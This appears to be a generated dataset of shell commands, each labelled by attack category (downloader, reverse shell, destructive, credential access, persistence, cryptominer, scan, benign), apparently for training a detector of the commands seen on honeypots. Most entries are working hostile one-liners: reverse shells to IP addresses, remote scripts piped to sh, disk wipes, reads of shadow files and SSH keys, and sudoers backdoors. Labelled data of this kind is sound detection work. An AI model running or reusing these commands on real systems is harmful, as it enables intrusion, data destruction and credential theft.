+{"text": "dash a.sh", "label": "malware_execution", "template": "malware_execution:29"}
+{"text": "echo cHJpbnQgImhpIg== | base64 -d | sh 2>/dev/null", "label": "malware_execution", "template": "malware_execution:36"}
+{"text": "wget -c https://203.196.244.101/dl/k", "label": "malware_downloader", "template": "malware_downloader:21"}
+{"text": "cat /dev/urandom > /dev/sda1", "label": "destructive", "template": "destructive:31"}
+{"text": "cd /tmp; cd /var/run; cd /tmp; perl mips.pl", "label": "malware_execution", "template": "malware_execution:33"}
+{"text": "chmod u+s /bin/bash", "label": "privilege_escalation", "template": "privilege_escalation:13"}
+{"text": "wget http://dl.node.online/bins/x > /dev/null 2>&1", "label": "malware_downloader", "template": "malware_downloader:19"}
+{"text": "dd if=/dev/zero of=/dev/sda bs=1M >/dev/null", "label": "destructive", "template": "destructive:9"}
+{"text": "python ld.sh.py &", "label": "malware_execution", "template": "malware_execution:31"}
+{"text": "tftp -g -r clean.sh 107.63.188.84", "label": "malware_downloader", "template": "malware_downloader:42"}
+{"text": "/bin/busybox wget http://filesnet.xyz:81/x/update.sh -O ld.sh", "label": "malware_downloader", "template": "malware_downloader:40"}
+{"text": "cd /mnt; rm -f /var/log/auth.log /var/log/secure &", "label": "defense_evasion", "template": "defense_evasion:14"}
+{"text": "cd /tmp; python exploit.py 2>/dev/null", "label": "privilege_escalation", "template": "privilege_escalation:24"}
+{"text": "/bin/busybox hostname RRHLYRPW", "label": "reconnaissance", "template": "reconnaissance:35"}
+{"text": "chmod +x arm7", "label": "malware_execution", "template": "malware_execution:7"}
+{"text": "./minerd -a cryptonight -o stratum+tcp://xmr.pool.example-pool.net:3333 -u 4dZAYPbdj0LpdsjXvCY7ypew5Ajbr0A4Nr1YzjwjEq4zCMQ5E65okmrTt1kNNbn4nyN4Ly8vrHUQ4dKF52Tb4XjchKSKkua -p x", "label": "cryptominer", "template": "cryptominer:4"}
+{"text": "unzip a.zip; ./a", "label": "malware_execution", "template": "malware_execution:41"}
+{"text": "sybcnu bvaugg", "label": "benign", "template": "benign:1"}
+{"text": "chmod +x /var/tmp/x86 &", "label": "malware_execution", "template": "malware_execution:8"}
+{"text": "cd /var/run; curl -fsSL http://cdn.bin.cn/tmp/mpsl | bash >/dev/null", "label": "malware_downloader", "template": "malware_downloader:28"}
+{"text": "nmap -sS 212.170.246.172/24", "label": "network_scan", "template": "network_scan:0"}
+{"text": "cd /tmp; aria2c http://193.247.150.203/bins/dota3.tar.gz", "label": "malware_downloader", "template": "malware_downloader:46"}
+{"text": "cd /var/tmp && rm -f .AOKNZWXM >/dev/null", "label": "reconnaissance", "template": "reconnaissance:10"}
+{"text": "chmod +x clean.sh && ./init.sh", "label": "malware_execution", "template": "malware_execution:11"}
+{"text": "ls /home 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:101"}
+{"text": "ls -la /root", "label": "reconnaissance", "template": "reconnaissance:102"}
+{"text": "rm -rf ~/*", "label": "destructive", "template": "destructive:3"}
+{"text": "uname -a; curl -s -L http://host-files.xyz:9999/bins/sh4 -o /root/x; perl /tmp/mpsl", "label": "malware_downloader", "template": "malware_downloader:18"}
+{"text": "wget -q -t 2 -T 10 -O bot https://103.253.235.241/tmp/sshd 2>/dev/null && echo WGETOK", "label": "malware_downloader", "template": "malware_downloader:12"}
+{"text": "./scanner 192.56.207.198", "label": "network_scan", "template": "network_scan:31"}
+{"text": "cd /usr/bin && shell > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:20"}
+{"text": "wget --no-check-certificate http://23.173.92.68/x/mips", "label": "malware_downloader", "template": "malware_downloader:22"}
+{"text": "which gcc >/dev/null", "label": "reconnaissance", "template": "reconnaissance:98"}
+{"text": "touch .ssh/authorized_keys", "label": "persistence", "template": "persistence:7"}
+{"text": "busybox nc 141.82.16.205 31337 -e /bin/sh", "label": "reverse_shell", "template": "reverse_shell:23"}
+{"text": "./cpuminer -a scrypt -o stratum+tcp://xmr.pool.example-pool.net:3333 -u admin", "label": "cryptominer", "template": "cryptominer:6"}
+{"text": "echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger", "label": "destructive", "template": "destructive:28"}
+{"text": "cd /etc; ./nicehash-miner &", "label": "cryptominer", "template": "cryptominer:24"}
+{"text": "man ls", "label": "benign", "template": "benign:58"}
+{"text": "cd /home/ubuntu; system >/dev/null", "label": "reconnaissance", "template": "reconnaissance:19"}
+{"text": "cd /tmp; cd /var/run; cd /root; touch .ssh/authorized_keys", "label": "persistence", "template": "persistence:7"}
+{"text": "echo 'stratum+tcp://xmr.pool.example-pool.net:3333' > pools.txt", "label": "cryptominer", "template": "cryptominer:25"}
+{"text": "ncat -z 89.237.14.117 22-443", "label": "network_scan", "template": "network_scan:22"}
+{"text": "STAT", "label": "benign", "template": "benign:12"}
+{"text": "which gcc", "label": "reconnaissance", "template": "reconnaissance:98"}
+{"text": "./ethminer -P stratum://442Juk5cGXcQ64DEiDhP1GuXCapyFpQvapA1u4MS9SVz0euvW3jShfQBZ4fZcnVCnnqLGqqU1g1SL6e5vDfmqh3qCSPtPCY@gulf.moneroocean.stream:10128", "label": "cryptominer", "template": "cryptominer:9"}
+{"text": "nc -zv 103.48.243.122 1-1000", "label": "network_scan", "template": "network_scan:20"}
+{"text": "tar czf /tmp/k.tgz ~/.ssh", "label": "credential_access", "template": "credential_access:31"}
+{"text": "sudo -l 2>/dev/null", "label": "privilege_escalation", "template": "privilege_escalation:7"}
+{"text": "cd /home/ubuntu && >/var/tmp/.TPYCHHFN &", "label": "reconnaissance", "template": "reconnaissance:33"}
+{"text": "cd /tmp && sudo /bin/sh > /dev/null 2>&1", "label": "privilege_escalation", "template": "privilege_escalation:6"}
+{"text": "curl -s ipinfo.io &", "label": "reconnaissance", "template": "reconnaissance:118"}
+{"text": "./xmrig --donate-level 1 -o stratum+tcp://xmr.pool.example-pool.net:3333 -u 4D5SZ4sUiHXArQPJ11v0YMN1TXiR3rXe8fNjMdCWasujDexB7Y3PKkszsZeZ1HUuu9PEsqYkfSE2swtZU6uNFcVbqXdC55w", "label": "cryptominer", "template": "cryptominer:1"}
+{"text": "php arm5.php", "label": "malware_execution", "template": "malware_execution:35"}
+{"text": "cd /tmp; cd /var/run; cd /root; cat config.json | grep pool", "label": "cryptominer", "template": "cryptominer:20"}
+{"text": "echo 'done' >> .axgwsoal", "label": "malware_downloader", "template": "malware_downloader:5"}
+{"text": "ps -ef", "label": "reconnaissance", "template": "reconnaissance:80"}
+{"text": "/bin/busybox sh4 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:109"}
+{"text": "cd /tmp; cd /var/run; cd /var/tmp; hydra -L users.txt -P passwords.txt 203.220.209.123 ssh", "label": "network_scan", "template": "network_scan:12"}
+{"text": "/arm7", "label": "reconnaissance", "template": "reconnaissance:123"}
+{"text": "cd /tmp; cd /var/run; cd /tmp; /bin/busybox echo > /var/run/.ZGWXDA && sh /etc/.ELCDO && cd /usr/bin/ 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:34"}
+{"text": "scp a.sh ftp@193.20.64.226:/tmp/ 2>/dev/null", "label": "network_scan", "template": "network_scan:18"}
+{"text": "cd /home/ubuntu; grep -r 'password' /etc 2>/dev/null", "label": "credential_access", "template": "credential_access:30"}
+{"text": "update-rc.d networkservice defaults", "label": "persistence", "template": "persistence:34"}
+{"text": "kill -9 $(pidof syslogd) > /dev/null 2>&1", "label": "defense_evasion", "template": "defense_evasion:32"}
+{"text": "echo hello", "label": "benign", "template": "benign:46"}
+{"text": "./exploit", "label": "privilege_escalation", "template": "privilege_escalation:23"}
+{"text": "pkill xmrig", "label": "cryptominer", "template": "cryptominer:14"}
+{"text": "./scanner 212.223.181.75", "label": "network_scan", "template": "network_scan:31"}
+{"text": "dd if=/dev/zero of=/dev/sda1 bs=4096", "label": "destructive", "template": "destructive:11"}
+{"text": "rm -rf /tmp/* /var/tmp/*", "label": "defense_evasion", "template": "defense_evasion:38"}
+{"text": "curl -k https://stage-update.ru/init.sh | bash", "label": "malware_downloader", "template": "malware_downloader:55"}
+{"text": "cd /mnt && ./mimipenguin 2>/dev/null", "label": "credential_access", "template": "credential_access:36"}
+{"text": "curl -O http://62.18.15.244/x86_64", "label": "malware_downloader", "template": "malware_downloader:25"}
+{"text": "./cpuminer-multi -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 > /dev/null 2>&1", "label": "cryptominer", "template": "cryptominer:7"}
+{"text": "cd /var/tmp; cat /root/.aws/credentials", "label": "credential_access", "template": "credential_access:11"}
+{"text": "cd /tmp && bash /tmp/mips.sh &", "label": "malware_execution", "template": "malware_execution:28"}
+{"text": "chmod 777 update.sh 2>&1", "label": "malware_execution", "template": "malware_execution:3"}
+{"text": "cd /tmp; cd /var/run; cd /root; echo XEYCZOK", "label": "reconnaissance", "template": "reconnaissance:37"}
+{"text": "sudo -s &", "label": "privilege_escalation", "template": "privilege_escalation:31"}
+{"text": "echo \"root ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers", "label": "privilege_escalation", "template": "privilege_escalation:29"}
+{"text": "crontab -r > /dev/null 2>&1", "label": "persistence", "template": "persistence:18"}
+{"text": "./une", "label": "malware_execution", "template": "malware_execution:6"}
+{"text": "systemctl daemon-reload", "label": "persistence", "template": "persistence:32"}
+{"text": "cd /var/run; curl -O https://178.191.95.89/dl/tsunami; sh run", "label": "malware_downloader", "template": "malware_downloader:34"}
+{"text": "echo \"git:GVRNEJHD\" | chpasswd", "label": "persistence", "template": "persistence:2"}
+{"text": "lwp-download http://107.24.157.180/payload.sh clean.sh", "label": "malware_downloader", "template": "malware_downloader:45"}
+{"text": "nmap -p 22 23.208.221.40", "label": "network_scan", "template": "network_scan:1"}
+{"text": "logout", "label": "benign", "template": "benign:45"}
+{"text": "nmap -p 22 62.220.252.44", "label": "network_scan", "template": "network_scan:1"}
+{"text": "cd /mnt; echo /tmp/sshd.so >> /etc/ld.so.preload 2>/dev/null", "label": "persistence", "template": "persistence:36"}
+{"text": "cat secrets.json", "label": "credential_access", "template": "credential_access:24"}
+{"text": "ruby -rsocket -e'f=TCPSocket.open(\"23.122.150.71\",443).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "label": "reverse_shell", "template": "reverse_shell:18"}
+{"text": "nc -e /bin/bash 203.101.46.134 4444", "label": "reverse_shell", "template": "reverse_shell:7"}
+{"text": "fetch http://107.140.221.221/files/update.sh", "label": "malware_downloader", "template": "malware_downloader:47"}
+{"text": "rm -rf .ZIMXR .fukhlkr", "label": "reconnaissance", "template": "reconnaissance:8"}
+{"text": "ls -l cpnhlru_2 2>/dev/null || echo '0'", "label": "reconnaissance", "template": "reconnaissance:12"}
+{"text": "cat wp-config.php >/dev/null", "label": "credential_access", "template": "credential_access:19"}
+{"text": "cd /tmp; cd /var/run; cd /usr/bin; python init.sh.py & > /dev/null 2>&1", "label": "malware_execution", "template": "malware_execution:31"}
+{"text": "ssh pi@178.17.97.137 'uname -a'", "label": "network_scan", "template": "network_scan:17"}
+{"text": "rm -f .SJMB", "label": "reconnaissance", "template": "reconnaissance:10"}
+{"text": "cd /tmp; cd /var/run; cd /etc; cat /etc/resolv.conf >/dev/null", "label": "reconnaissance", "template": "reconnaissance:77"}
+{"text": "cd /tmp; cd /var/run; cd /etc; who", "label": "reconnaissance", "template": "reconnaissance:60"}
+{"text": ">/home/ubuntu/d && chmod 777 /var/tmp/d && /home/ubuntu/d && cd /home/ubuntu/", "label": "reconnaissance", "template": "reconnaissance:0"}
+{"text": "curl -s https://77.6.108.79/cdn/x86_64 | sh > /dev/null 2>&1", "label": "malware_downloader", "template": "malware_downloader:29"}
+{"text": "echo -ne \"\\x70\\xe2\\x66\\x82\\x67\\x91\\x9d\\xc7\\x0a\\xdc\\x40\\xa5\\x99\\x96\\x75\\xcd\\x0b\\x81\\xcd\\xb7\\xde\\xbe\\x1f\\x84\\x2a\\x90\\x1a\\xb3\\x62\\xd9\\x37\\xa3\\xce\\x8f\\xae\\x0a\\xc2\\xaf\\x86\\xf1\\xcd\\xb6\\x7f\\x59\\x8d\\xc8\\x5f\\x55\" >> update.XDarmv5l", "label": "malware_downloader", "template": "malware_downloader:7"}
+{"text": "mkfs -t ext4 /dev/sda", "label": "destructive", "template": "destructive:14"}
+{"text": "cat xmr.sh | sh", "label": "malware_execution", "template": "malware_execution:42"}
+{"text": "chmod +x systemd-helper && ./systemd-helper", "label": "malware_execution", "template": "malware_execution:11"}
+{"text": "cd /mnt && wget http://stage.dl.club/~u/mips -O /usr/bin/systemd-helper > /dev/null 2>&1", "label": "malware_downloader", "template": "malware_downloader:23"}
+{"text": "cd /mnt", "label": "benign", "template": "benign:40"}
+{"text": "goxz3", "label": "benign", "template": "benign:2"}
+{"text": "./sshd -c config.json", "label": "cryptominer", "template": "cryptominer:21"}
+{"text": "nohup /usr/bin/gafgyt > /dev/null 2>&1 &", "label": "malware_execution", "template": "malware_execution:22"}
+{"text": ">/LKLAICZW && cd /", "label": "reconnaissance", "template": "reconnaissance:32"}
+{"text": "echo 'sh /var/run/arm' >> ~/.bashrc", "label": "persistence", "template": "persistence:20"}
+{"text": "cd /mnt && nikto -h 45.44.77.134", "label": "network_scan", "template": "network_scan:23"}
+{"text": "bash /tmp/arm5.sh &", "label": "malware_execution", "template": "malware_execution:28"}
+{"text": "bash -i >& /dev/tcp/203.156.86.229/31337 0>&1", "label": "reverse_shell", "template": "reverse_shell:0"}
+{"text": "crontab /var/run/cron.txt &", "label": "persistence", "template": "persistence:17"}
+{"text": "echo 'wget -q http://static-static.tk/bins/arm5 -O .c||curl -s http://45.219.30.131/~u/run -o .c||tftp -g -l .c -r dota3.tar.gz 185.156.67.56' >> .s", "label": "malware_downloader", "template": "malware_downloader:6"}
+{"text": "cd /dev/shm && ls", "label": "benign", "template": "benign:63"}
+{"text": "crontab /var/tmp/cron.txt", "label": "persistence", "template": "persistence:17"}
+{"text": "w\\get; chmod +x networkservice; ./bins.sh", "label": "malware_execution", "template": "malware_execution:48"}
+{"text": "(score+5)", "label": "benign", "template": "benign:23"}
+{"text": "/bin/busybox echo > /var/run/.XASYYW && sh /var/run/.ULGIT && cd /dev/shm/ &", "label": "reconnaissance", "template": "reconnaissance:34"}
+{"text": "socat tcp-connect:45.143.237.159:4444 exec:/bin/sh", "label": "reverse_shell", "template": "reverse_shell:20"}
+{"text": "chmod +x dota3.tar.gz", "label": "malware_execution", "template": "malware_execution:7"}
+{"text": "cd /root", "label": "benign", "template": "benign:40"}
+{"text": "nc 45.79.116.241 9001 -e /bin/sh", "label": "reverse_shell", "template": "reverse_shell:8"}
+{"text": "echo \"root:RTAPM96\"|chpasswd|bash", "label": "persistence", "template": "persistence:0"}
+{"text": "sshpass -p admin ssh support@45.251.154.196", "label": "network_scan", "template": "network_scan:32"}
+{"text": "cd /var/tmp && cat /etc/shadow >/dev/null", "label": "credential_access", "template": "credential_access:0"}
+{"text": "nc -e /bin/bash 5.245.154.145 4444", "label": "reverse_shell", "template": "reverse_shell:7"}
+{"text": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.175.16.218\",6666));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'", "label": "reverse_shell", "template": "reverse_shell:15"}
+{"text": "tree", "label": "benign", "template": "benign:64"}
+{"text": "cd /root; w", "label": "reconnaissance", "template": "reconnaissance:59"}
+{"text": "./dota3.tar.gz &", "label": "malware_execution", "template": "malware_execution:16"}
+{"text": "passwd ftp", "label": "persistence", "template": "persistence:30"}
+{"text": "perl /mnt/payload.sh.pl &", "label": "malware_execution", "template": "malware_execution:34"}
+{"text": "su -", "label": "privilege_escalation", "template": "privilege_escalation:3"}
+{"text": "rm -rf .OHYUQK .psnhexh", "label": "reconnaissance", "template": "reconnaissance:8"}
+{"text": "./kinsing", "label": "cryptominer", "template": "cryptominer:12"}
+{"text": "netcat -e /bin/sh 23.146.53.176 5555", "label": "reverse_shell", "template": "reverse_shell:11"}
+{"text": "cd /var/run; echo -ne \"\\x4d\\xf6\\x91\\xb0\\x31\\xf3\\x64\\xe8\\x6d\\x7b\\xe9\\xfd\\x43\\xe1\\xde\\x9e\\xc0\\xf1\\x23\\x23\\x4b\\xab\\x0b\\xc8\\x6f\\x10\\x19\\x13\\x6e\\x9c\\x42\\xd1\\xf7\\xf7\\x41\\x5a\\xdc\\x5e\\x38\\x0f\\x7a\\x2d\\xda\\x7b\\xdb\\xfd\\x1a\\xbf\" >> dota3.tar.gz", "label": "malware_downloader", "template": "malware_downloader:11"}
+{"text": "gtfqqqfy6", "label": "benign", "template": "benign:2"}
+{"text": "cd /usr/bin; cat systemd-helper | sh >/dev/null", "label": "malware_execution", "template": "malware_execution:42"}
+{"text": "cd /dev/shm && wget http://178.27.62.163/x/m68k", "label": "malware_downloader", "template": "malware_downloader:52"}
+{"text": "chattr +i ~/.ssh/authorized_keys", "label": "persistence", "template": "persistence:12"}
+{"text": "help", "label": "benign", "template": "benign:59"}
+{"text": "cd /root; chmod +x dota3.tar.gz; ./networkservice", "label": "malware_execution", "template": "malware_execution:46"}
+{"text": "ps aux | wc -l > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:82"}
+{"text": "./systemd-helper > /dev/null 2>&1 & > /dev/null 2>&1", "label": "malware_execution", "template": "malware_execution:17"}
+{"text": "nmap -Pn -T4 77.43.107.32/16", "label": "network_scan", "template": "network_scan:3"}
+{"text": "zljmwgy", "label": "benign", "template": "benign:0"}
+{"text": "hostname 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:56"}
+{"text": "cd /usr/bin && cat /proc/meminfo | grep MemTotal", "label": "reconnaissance", "template": "reconnaissance:66"}
+{"text": "history -n", "label": "defense_evasion", "template": "defense_evasion:6"}
+{"text": "iptables -F > /dev/null 2>&1", "label": "defense_evasion", "template": "defense_evasion:27"}
+{"text": "echo 'wget -q https://mirror-host.site/tmp/spc -O .c||curl -s http://62.34.219.89/tmp/arm -o .c||tftp -g -l .c -r run 193.169.117.179' >> .s", "label": "malware_downloader", "template": "malware_downloader:6"}
+{"text": "cd /tmp; curl -sL http://193.190.2.133/sh4 | python", "label": "malware_downloader", "template": "malware_downloader:49"}
+{"text": "curl http://77.231.78.210:5555/a.sh -o x86", "label": "malware_downloader", "template": "malware_downloader:53"}
+{"text": "cat /proc/mounts; /bin/busybox URONYC", "label": "reconnaissance", "template": "reconnaissance:27"}
+{"text": "lsblk >/dev/null", "label": "reconnaissance", "template": "reconnaissance:114"}
+{"text": "cd /root && php kaiten.php >/dev/null", "label": "malware_execution", "template": "malware_execution:35"}
+{"text": "./xmrig -o pool.minexmr.com:4444 -u 49CsFFz29s7za7W3q5syY0ei6QvgbNaEZwnt4NE3rodHrypEymhYkUEpCZbKwb8maTWSU9ceb57AXFzUyHTt7KqeDcePcga -p x 2>/dev/null", "label": "cryptominer", "template": "cryptominer:0"}
+{"text": "wget -q https://mirror-net.info/dl/systemd-helper", "label": "malware_downloader", "template": "malware_downloader:20"}
+{"text": "wget -c http://5.24.100.231/mips", "label": "malware_downloader", "template": "malware_downloader:21"}
+{"text": "gcc -o dirty dirty.c -pthread && ./dirty", "label": "privilege_escalation", "template": "privilege_escalation:21"}
+{"text": "tar xvf xmr.sh.tgz; cd gafgyt; ./run", "label": "malware_execution", "template": "malware_execution:40"}
+{"text": "cd /tmp; cd /var/run; cd /home/ubuntu; ps -ef | grep -i miner | grep -v grep", "label": "cryptominer", "template": "cryptominer:17"}
+{"text": "uname -a && whoami", "label": "reconnaissance", "template": "reconnaissance:53"}
+{"text": "cd /etc; cat .s || cp /bin/echo .s; /bin/busybox KXJVTXJP", "label": "reconnaissance", "template": "reconnaissance:28"}
+{"text": "for ip in $(cat ips.txt); do ssh root@$ip id; done", "label": "network_scan", "template": "network_scan:28"}
+{"text": "busybox tftp -g -r sshd 192.160.79.146", "label": "malware_downloader", "template": "malware_downloader:41"}
+{"text": "rm -rf m68k; wget http://stage.stage.info/~u/x86; chmod +x ld.sh; ./ld.sh", "label": "malware_downloader", "template": "malware_downloader:36"}
+{"text": "nmap -sV -p- 192.146.112.92", "label": "network_scan", "template": "network_scan:2"}
+{"text": "find / -name \"*.php\" -exec rm {} \\;", "label": "destructive", "template": "destructive:24"}
+{"text": "/dev/shm/m68k &", "label": "malware_execution", "template": "malware_execution:19"}
+{"text": "cat wp-config.php", "label": "credential_access", "template": "credential_access:19"}
+{"text": "su - admin", "label": "privilege_escalation", "template": "privilege_escalation:32"}
+{"text": "find / -name id_rsa 2>/dev/null", "label": "credential_access", "template": "credential_access:8"}
+{"text": "cat /root/.aws/credentials &", "label": "credential_access", "template": "credential_access:11"}
+{"text": "cd /dev/shm && history -n", "label": "defense_evasion", "template": "defense_evasion:6"}
+{"text": "cd /root; last > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:61"}
+{"text": "cat /proc/self/cmdline 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:40"}
+{"text": "for p in $(ls /proc | grep -E '^[0-9]+$'); do kill -9 $p; done", "label": "defense_evasion", "template": "defense_evasion:2"}
+{"text": "cd /var/run && strings /proc/*/environ | grep -i pass", "label": "credential_access", "template": "credential_access:35"}
+{"text": "nmap -sV -p- 107.9.111.176", "label": "network_scan", "template": "network_scan:2"}
+{"text": "cd /tmp; wget https://62.114.28.210/setup.sh -O /home/ubuntu/x86 > /dev/null 2>&1", "label": "malware_downloader", "template": "malware_downloader:23"}
+{"text": "./cpuminer-multi -a cryptonight -o stratum+tcp://xmr-eu1.nanopool.org:14444", "label": "cryptominer", "template": "cryptominer:7"}
+{"text": "chmod +x spc; sh init.sh", "label": "malware_execution", "template": "malware_execution:13"}
+{"text": "curl --output m68k http://dl.data.info/dl/arm7", "label": "malware_downloader", "template": "malware_downloader:27"}
+{"text": "cd /mnt; chmod +x m68k", "label": "malware_execution", "template": "malware_execution:7"}
+{"text": "nc -z 5.158.246.229 22 2>/dev/null", "label": "network_scan", "template": "network_scan:21"}
+{"text": "cat /home/git/.bash_history 2>/dev/null", "label": "credential_access", "template": "credential_access:27"}
+{"text": "echo -e \"pjk74\\nWQDYP\\nILKWTCTH\"|passwd|bash >/dev/null", "label": "persistence", "template": "persistence:1"}
+{"text": "cd /tmp; cd /var/run; cd /usr/bin; free -h", "label": "reconnaissance", "template": "reconnaissance:17"}
+{"text": "cd /tmp; cd /var/run; cd /home/ubuntu; echo GWWH &", "label": "reconnaissance", "template": "reconnaissance:5"}
+{"text": "cd /home/ubuntu; cat ~/.git-credentials > /dev/null 2>&1", "label": "credential_access", "template": "credential_access:13"}
+{"text": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:193.171.43.129:1337", "label": "reverse_shell", "template": "reverse_shell:19"}
+{"text": "cd /tmp; cd /var/run; cd /var/tmp; curl ifconfig.me > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:116"}
+{"text": "useradd -ou 0 -g 0 admin &", "label": "persistence", "template": "persistence:23"}
+{"text": "rwlssx", "label": "benign", "template": "benign:0"}
+{"text": "which sh4", "label": "reconnaissance", "template": "reconnaissance:47"}
+{"text": "/bin/busybox ECCHI", "label": "reconnaissance", "template": "reconnaissance:110"}
+{"text": "cd /tmp; cd /var/run; cd /home/ubuntu; mkfs.xfs /dev/vda1 2>/dev/null", "label": "destructive", "template": "destructive:15"}
+{"text": "ok", "label": "benign", "template": "benign:19"}
+{"text": "bash -c 'bash -i >& /dev/tcp/89.79.125.26/6666 0>&1'", "label": "reverse_shell", "template": "reverse_shell:2"}
+{"text": "rm -rf .ZBUSTK .ycirt > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:8"}
+{"text": "chmod 777 tsunami > /dev/null 2>&1", "label": "malware_execution", "template": "malware_execution:9"}
+{"text": "rm -rf .ssh/authorized_keys 2>/dev/null", "label": "persistence", "template": "persistence:8"}
+{"text": "cd /etc; cat /var/www/.env 2>/dev/null", "label": "credential_access", "template": "credential_access:22"}
+{"text": "# Method 3: xmtqo to stdout", "label": "benign", "template": "benign:16"}
+{"text": "systemctl stop firewalld", "label": "defense_evasion", "template": "defense_evasion:24"}
+{"text": "cd /var/run && crontab -r >/dev/null", "label": "persistence", "template": "persistence:18"}
+{"text": "echo -ne \"\\xcd\\x5e\\x88\\xcd\\x6c\\xb5\\xc3\\xc8\\x38\\xb5\\x58\\xc1\\x52\\x4a\\x3a\\x2b\\xf1\\x57\\x4c\\xae\\xd9\\x3c\\x31\\xb0\\xfb\\x4b\\xf8\\xca\\x9b\\xda\\x6a\\x72\" >> systemd-helper", "label": "malware_downloader", "template": "malware_downloader:8"}
+{"text": "cd /tmp && wget ftp://77.125.217.185/clean.sh", "label": "malware_downloader", "template": "malware_downloader:48"}
+{"text": "cd /var/run && curl -s http://5.39.51.158/bins/dota3.tar.gz -o /home/ubuntu/clean.sh", "label": "malware_downloader", "template": "malware_downloader:26"}
+{"text": "echo WHJS_CHECK", "label": "reconnaissance", "template": "reconnaissance:36"}
+{"text": "exit", "label": "benign", "template": "benign:44"}
+{"text": "wc -l file.txt", "label": "benign", "template": "benign:76"}
+{"text": "echo -e '\\xa0\\xdb\\x5d\\xb6\\x3f\\xfc\\x1e\\x1a\\x5d\\x86\\x67\\x87\\xc1\\x6a\\xd6\\x71\\xb4\\x60\\x79\\x83\\x06\\x61\\xba\\x38\\x3e\\x4f\\xc9\\xcc\\x14\\x94\\x3a\\xf0\\x35\\x71\\x06\\x50\\x28\\x74\\x62\\xf4\\x0b\\x18\\x20\\x23\\xfa\\x08\\x44\\x43' >> x86", "label": "malware_downloader", "template": "malware_downloader:10"}
+{"text": "Via: SIP/2.0/UDP 185.234.104.148:5060;branch=z9hG4bKhbnhvz", "label": "benign", "template": "benign:9"}
+{"text": "uname -m", "label": "reconnaissance", "template": "reconnaissance:51"}
+{"text": "ncorrect", "label": "benign", "template": "benign:24"}
+{"text": "perl -e 'use Socket;$i=\"45.213.230.167\";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");exec(\"/bin/sh -i\");};'", "label": "reverse_shell", "template": "reverse_shell:16"}
+{"text": "cd /var/tmp; rm -rf ~/* 2>/dev/null", "label": "destructive", "template": "destructive:3"}
+{"text": "bash .qyjlu; rm -f .kyiejkgc", "label": "malware_execution", "template": "malware_execution:2"}
+{"text": "ncat -z 107.161.105.27 22-443", "label": "network_scan", "template": "network_scan:22"}
+{"text": "./cpuminer -a scrypt -o stratum+tcp://gulf.moneroocean.stream:10128 -u ubuntu", "label": "cryptominer", "template": "cryptominer:6"}
+{"text": "bash .miaaudvs; rm -f .joqe", "label": "malware_execution", "template": "malware_execution:2"}
+{"text": ">/usr/bin/d && chmod 777 /dev/shm/d && /var/tmp/d && cd /tmp/", "label": "reconnaissance", "template": "reconnaissance:0"}
+{"text": "exec 5<>/dev/tcp/192.141.51.165/53; cat <&5 | while read line; do $line 2>&5 >&5; done", "label": "reverse_shell", "template": "reverse_shell:5"}
+{"text": "curl -k https://stagenet.online/clean.sh | bash", "label": "malware_downloader", "template": "malware_downloader:55"}
+{"text": "sh -i >& /dev/udp/192.110.35.179/4444 0>&1", "label": "reverse_shell", "template": "reverse_shell:3"}
+{"text": "cat ~/.ssh/id_rsa >/dev/null", "label": "credential_access", "template": "credential_access:6"}
+{"text": "ncrack -p 22 203.18.117.92", "label": "network_scan", "template": "network_scan:14"}
+{"text": "/var/tmp/clean.sh", "label": "malware_execution", "template": "malware_execution:18"}
+{"text": "setsid ./m68k &", "label": "malware_execution", "template": "malware_execution:23"}
+{"text": "mv /home/* /dev/null >/dev/null", "label": "destructive", "template": "destructive:26"}
+{"text": "sh .s; rm -f .s 2>/dev/null", "label": "malware_execution", "template": "malware_execution:0"}
+{"text": "id 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:55"}
+{"text": "service iptables stop 2>/dev/null", "label": "defense_evasion", "template": "defense_evasion:23"}
+{"text": "cd /tmp; cd /var/run; cd /root; chmod 4755 /mnt/x86_64", "label": "privilege_escalation", "template": "privilege_escalation:14"}
+{"text": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://net.net.top/spc; curl -O http://host.files.ru/~u/dota3.tar.gz; chmod 777 init.sh; sh kworkerds", "label": "malware_downloader", "template": "malware_downloader:35"}
+{"text": "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf && sysctl -p &", "label": "cryptominer", "template": "cryptominer:18"}
+{"text": "openssl s_client -quiet -connect 5.59.161.116:9001 | /bin/sh | openssl s_client -quiet -connect 103.222.134.118:9999", "label": "reverse_shell", "template": "reverse_shell:22"}
+{"text": "/tmp/kdevtmpfsi & > /dev/null 2>&1", "label": "cryptominer", "template": "cryptominer:11"}
+{"text": "cd /tmp && echo -en \"\\x00\\xbf\\x8b\\x59\\xbd\\x1d\\x76\\xf2\\x01\\x51\\x24\\xff\\xa4\\xf8\\x9e\\xd0\\x2f\\xdb\\x89\\x5c\\xb8\\x87\\xdc\\x70\" > /etc/x86_64", "label": "malware_downloader", "template": "malware_downloader:9"}
+{"text": "cd /usr/bin; wget https://141.134.37.126:8888/x/dota3.tar.gz -O- | sh", "label": "malware_downloader", "template": "malware_downloader:14"}
+{"text": "OPTIONS * RTSP/1.0", "label": "benign", "template": "benign:13"}
+{"text": "echo DRDNVCEF >/root/.testfile 2>&1", "label": "reconnaissance", "template": "reconnaissance:13"}
+{"text": "cd /dev/shm; echo c > /proc/sysrq-trigger", "label": "destructive", "template": "destructive:27"}
